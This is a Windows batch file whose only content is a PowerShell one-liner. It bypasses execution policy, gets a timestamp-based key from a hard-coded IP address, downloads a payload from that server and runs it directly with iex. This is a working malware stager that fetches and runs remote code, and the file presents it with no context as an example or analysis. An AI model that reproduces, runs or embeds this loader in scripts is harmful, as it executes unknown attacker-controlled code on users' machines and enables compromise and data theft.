@echo off
powershell -NoProfile -ExecutionPolicy Bypass -Command ^
"$base='http://82.29.153.101:5000'; ^
$ts=[int][DateTimeOffset]::UtcNow.ToUnixTimeSeconds(); ^
$k=(iwr ($base+'/auth/key?ts='+$ts) -UseBasicParsing).Content.Trim(); ^
$p=iwr ($base+'/payload/encrypted') -Headers @{ 'X-Decrypt-Key'=$k } -UseBasicParsing; ^
iex $p.Content"